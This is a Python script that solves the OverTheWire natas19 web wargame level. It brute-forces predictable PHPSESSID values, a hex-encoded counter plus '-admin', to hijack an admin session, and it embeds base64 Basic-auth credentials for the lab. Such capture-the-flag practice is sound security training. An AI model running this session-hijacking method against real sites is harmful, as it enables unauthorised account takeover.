#!/usr/bin/env python3

import requests
import time
import codecs
import re
import binascii

session = requests.session()
total_sessions = 640

url = "http://natas19.natas.labs.overthewire.org:80/index.php"

natas19_cookies = {"__utma": "176859643.1576322311.1574691834.1574696384.1574698992.3", "__utmz": "176859643.1574691834.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)"}

natas19_hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://natas19.natas.labs.overthewire.org/", "Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

natas19_data = {"username": "user", "password": "pass"}

def hexify_digits(integer):
	x = ""
	for i in str(integer):
		tmp = str(codecs.encode(bytes([ord(i)]),"hex"))
		x += re.search('b\'(?P<hexa>[0-9a-fA-F]+)\'',tmp).group('hexa')
	return x

s = time.perf_counter()

for i in range(total_sessions):
	natas19_cookies['PHPSESSID'] = hexify_digits(i) + re.search('b\'(?P<hexa>[0-9a-fA-F]+)\'',str(binascii.hexlify(b'-admin'))).group('hexa')
	res = session.post(url, headers=natas19_hdrs, cookies=natas19_cookies, data=natas19_data)
	if ('You are an admin. The credentials for the next level are:<br>' in res.text):
		print("PHPSESSID = " + str(i))		
		print(res.text)
		elapsed = time.perf_counter() - s
		print(f"Time taken: {elapsed:0.2f} seconds")
		break
